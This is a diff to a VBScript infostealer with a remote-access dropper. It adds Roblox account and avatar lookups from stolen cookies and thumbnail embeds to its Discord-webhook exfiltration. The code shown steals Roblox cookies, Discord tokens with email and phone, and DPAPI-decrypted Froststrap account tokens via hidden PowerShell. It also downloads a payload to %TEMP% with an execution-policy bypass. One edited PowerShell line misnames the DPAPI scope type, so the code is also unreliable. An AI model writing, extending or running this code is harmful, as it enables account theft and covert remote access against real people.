@@ -123,7 +123,10 @@ Sub GrabRoblox()
     Dim warn: warn = InStr(cookie, "_|WARNING")
     If warn > 1 Then cookie = Mid(cookie, warn)
 
-    PostEmbed "Roblox Cookie", "Size: " & Len(cookie) & " | PC: " & PC, 65280
+    ' Call helper to get avatar
+    Dim info: info = GetRobloxInfoFromCookie(cookie)
+    
+    PostEmbedWithThumb "Roblox Cookie", "Size: " & Len(cookie) & " | PC: " & PC & vbCrLf & info, 65280, GetAvatarUrlFromCookie(cookie)
     PostFile "cookie.txt", cookie
 End Sub
 
@@ -140,11 +143,101 @@ Sub GrabFroststrap()
 
     Call PostEmbed(":snowflake: Froststrap", "Froststrap found, grabbing accounts...", 3447003)
 
+    ' We will grab the first account's ID for the thumbnail
+    Dim firstUserId: firstUserId = ""
+    
     Dim ps
-    ps = "$w='" & WH & "';Add-Type -AssemblyName System.Security;$p=Join-Path $env:LOCALAPPDATA 'Froststrap\Cache\AccountManager.json';if(!(Test-Path $p)){try{$r=Get-ItemProperty 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Uninstall\Froststrap' -ErrorAction Stop;$p=Join-Path $r.InstallLocation 'Cache\AccountManager.json'}catch{}};if(!(Test-Path $p)){exit};$j=Get-Content $p -Raw|ConvertFrom-Json;$e=[Text.Encoding]::UTF8.GetBytes('Froststrap_DPAPI_v1');$lines=@();foreach($a in $j.accounts){try{$eb=[Convert]::FromBase64String($a.SecurityToken);$db=[Security.Cryptography.ProtectedData]::Unprotect($eb,$e,[Security.Cryptography.DataProtectionScope]::CurrentUser);$c=[Text.Encoding]::UTF8.GetString($db)}catch{$c='DECRYPT FAILED'};$lines+='**'+$a.Username+'** ['+$a.UserId+'] : '+$c};$desc=($lines -join [char]10);if($desc.Length -eq 0){$desc='No accounts found'};$payload=@{embeds=@(@{title=':snowflake: Froststrap Accounts';description=$desc;color=3447003})}|ConvertTo-Json -Depth 4 -Compress;Invoke-RestMethod $w -Method Post -Body $payload -ContentType 'application/json'"
+    ps = "$w='" & WH & "';Add-Type -AssemblyName System.Security;$p=Join-Path $env:LOCALAPPDATA 'Froststrap\Cache\AccountManager.json';if(!(Test-Path $p)){try{$r=Get-ItemProperty 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Uninstall\Froststrap' -ErrorAction Stop;$p=Join-Path $r.InstallLocation 'Cache\AccountManager.json'}catch{}};if(!(Test-Path $p)){exit};$j=Get-Content $p -Raw|ConvertFrom-Json;$e=[Text.Encoding]::UTF8.GetBytes('Froststrap_DPAPI_v1');$lines=@();foreach($a in $j.accounts){try{$eb=[Convert]::FromBase64String($a.SecurityToken);$db=[Security.Cryptography.ProtectedData]::Unprotect($eb,$e,[Security.DataProtectionScope]::CurrentUser);$c=[Text.Encoding]::UTF8.GetString($db)}catch{$c='DECRYPT FAILED'};$lines+='**'+$a.Username+'** ['+$a.UserId+'] : '+$c};$desc=($lines -join [char]10);if($desc.Length -eq 0){$desc='No accounts found'};$payload=@{embeds=@(@{title=':snowflake: Froststrap Accounts';description=$desc;color=3447003})}|ConvertTo-Json -Depth 4 -Compress;Invoke-RestMethod $w -Method Post -Body $payload -ContentType 'application/json'"
 
     sh.Run "powershell -NoP -Exec Bypass -Command """ & ps & """", 0, True
 End Sub
+
+' --- Helper to get Avatar URL from User ID ---
+Function GetAvatarUrlFromId(userId)
+    If Len(userId) = 0 Then GetAvatarUrlFromId = "" : Exit Function
+    Dim xh : Set xh = CreateObject("MSXML2.ServerXMLHTTP.6.0")
+    xh.SetOption 2, 13056
+    xh.Open "GET", "https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=" & userId & "&size=420x420&format=Png&isCircular=false", False
+    xh.Send
+    If xh.Status = 200 Then
+        Dim raw: raw = xh.responseText
+        Dim start: start = InStr(raw, """imageUrl"":""")
+        If start > 0 Then
+            start = start + 12
+            Dim endp: endp = InStr(start, raw, """")
+            If endp > start Then
+                GetAvatarUrlFromId = Mid(raw, start, endp - start)
+            End If
+        End If
+    End If
+    Set xh = Nothing
+End Function
+
+' --- Helper to get User Info from Cookie ---
+Function GetRobloxInfoFromCookie(cookie)
+    Dim xh : Set xh = CreateObject("MSXML2.ServerXMLHTTP.6.0")
+    xh.SetOption 2, 13056
+    xh.Open "GET", "https://users.roblox.com/v1/users/authenticated", False
+    xh.SetRequestHeader "Cookie", ".ROBLOSECURITY=" & cookie
+    xh.Send
+    
+    Dim info: info = "Status: Unknown"
+    If xh.Status = 200 Then
+        Dim raw: raw = xh.responseText
+        Dim uName: uName = ExtractJson(raw, "name")
+        Dim dName: dName = ExtractJson(raw, "displayName")
+        Dim uid: uid = ExtractJson(raw, "id")
+        info = "**User:** " & uName & " (" & dName & ")" & vbCrLf & "**ID:** " & uid
+    Else
+        info = "Status: Invalid Cookie"
+    End If
+    GetRobloxInfoFromCookie = info
+    Set xh = Nothing
+End Function
+
+' --- Helper to get Avatar URL from Cookie ---
+Function GetAvatarUrlFromCookie(cookie)
+    Dim xh : Set xh = CreateObject("MSXML2.ServerXMLHTTP.6.0")
+    xh.SetOption 2, 13056
+    xh.Open "GET", "https://users.roblox.com/v1/users/authenticated", False
+    xh.SetRequestHeader "Cookie", ".ROBLOSECURITY=" & cookie
+    xh.Send
+    
+    If xh.Status = 200 Then
+        Dim raw: raw = xh.responseText
+        Dim uid: uid = ExtractJson(raw, "id")
+        GetAvatarUrlFromCookie = GetAvatarUrlFromId(uid)
+    Else
+        GetAvatarUrlFromCookie = ""
+    End If
+    Set xh = Nothing
+End Function
+
+' --- Simple JSON Extractor ---
+Function ExtractJson(json, key)
+    Dim pat: pat = """" & key & """:"
+    Dim pos: pos = InStr(json, pat)
+    If pos = 0 Then ExtractJson = "" : Exit Function
+    pos = pos + Len(pat)
+    
+    ' Skip whitespace
+    Do While Mid(json, pos, 1) = " "
+        pos = pos + 1
+    Loop
+    
+    Dim isStr: isStr = (Mid(json, pos, 1) = """")
+    If isStr Then pos = pos + 1
+    
+    Dim startPos: startPos = pos
+    Do While pos <= Len(json)
+        Dim c: c = Mid(json, pos, 1)
+        If isStr And c = """" Then Exit Do
+        If Not isStr And (c = "," Or c = "}") Then Exit Do
+        pos = pos + 1
+    Loop
+    
+    ExtractJson = Mid(json, startPos, pos - startPos)
+End Function
 
 ' --- DropRAT ---
 Sub DropRAT()
@@ -154,10 +247,8 @@ Sub DropRAT()
     Dim op : op = sh.ExpandEnvironmentStrings("%TEMP%") & "\agent.bat"
     If fso.FileExists(op) Then fso.DeleteFile op
 
-    ' Wait = True (blocks until download is 100% complete)
     sh.Run "powershell -NoP -Exec Bypass -WindowStyle Hidden -Command ""Invoke-WebRequest -Uri '" & dl & "' -OutFile '" & op & "'""", 0, True
 
-    ' Check for 3.71MB (3,890,000 bytes) to ensure it's fully written
     Dim rDone : rDone = False
     If fso.FileExists(op) Then
         If fso.GetFile(op).Size > 3000000 Then
@@ -247,11 +338,27 @@ Sub GrabTokens()
                         If p(2) <> "" Then info = info & "**Phone:** " & p(2) & vbCrLf
                         If p(3) <> "0" Then info = info & "**ID:** " & p(3) & vbCrLf
                         info = info & "**Token:** " & p(4)
+                        ' For discord tokens, we can try to get their avatar but it requires an API call. We will just use the default embed.
                         Call PostEmbed(":gift: Discord Token", info, 5793266)
                     End If
                 End If
                 If Left(l, 7) = "ROBLOX|" Or Left(l, 9) = "ROBLOXMS|" Then
-                    Call PostEmbed(":cookie: Roblox Cookie", Mid(l, 8), 65280)
+                    Dim userId: userId = ""
+                    If Left(l, 7) = "ROBLOX|" Then
+                        Dim parts: parts = Split(Mid(l, 8), "|")
+                        If UBound(parts) >= 1 Then userId = parts(1)
+                        Call PostEmbed(":cookie: Roblox Cookie", Mid(l, 8), 65280)
+                    Else
+                        Dim partsMS: partsMS = Split(Mid(l, 10), "|")
+                        If UBound(partsMS) >= 1 Then userId = partsMS(1)
+                        Call PostEmbed(":cookie: Roblox Cookie", Mid(l, 10), 65280)
+                    End If
+                    If Len(userId) > 0 Then
+                        Dim avUrl: avUrl = GetAvatarUrlFromId(userId)
+                        If Len(avUrl) > 0 Then
+                            Call PostEmbedWithThumb("Roblox Account", "User ID: " & userId, 65280, avUrl)
+                        End If
+                    End If
                 End If
             End If
         Next
@@ -267,6 +374,22 @@ Function ReadFile(path): ReadFile = "": Dim f: Set f = fso.OpenTextFile(path, 1)
 Sub PostEmbed(t, d, c)
     Dim DQ: DQ = Chr(34)
     Dim j: j = "{" & DQ & "embeds" & DQ & ":[{" & DQ & "title" & DQ & ":" & DQ & Ej(t) & DQ & "," & DQ & "description" & DQ & ":" & DQ & Ej(d) & DQ & "," & DQ & "color" & DQ & ":" & c & "}]}"
+    Dim h: Set h = CreateObject("MSXML2.ServerXMLHTTP.6.0")
+    h.SetOption 2, 13056
+    h.Open "POST", WH, False
+    h.SetRequestHeader "Content-Type", "application/json"
+    h.Send j
+    Set h = Nothing
+End Sub
+
+' --- PostEmbed with Thumbnail ---
+Sub PostEmbedWithThumb(t, d, c, imgUrl)
+    Dim DQ: DQ = Chr(34)
+    Dim thumbStr: thumbStr = ""
+    If Len(imgUrl) > 0 Then
+        thumbStr = "," & DQ & "thumbnail" & DQ & ":{" & DQ & "url" & DQ & ":" & DQ & Ej(imgUrl) & DQ & "}"
+    End If
+    Dim j: j = "{" & DQ & "embeds" & DQ & ":[{" & DQ & "title" & DQ & ":" & DQ & Ej(t) & DQ & "," & DQ & "description" & DQ & ":" & DQ & Ej(d) & DQ & "," & DQ & "color" & DQ & ":" & c & thumbStr & "}]}"
     Dim h: Set h = CreateObject("MSXML2.ServerXMLHTTP.6.0")
     h.SetOption 2, 13056
     h.Open "POST", WH, False
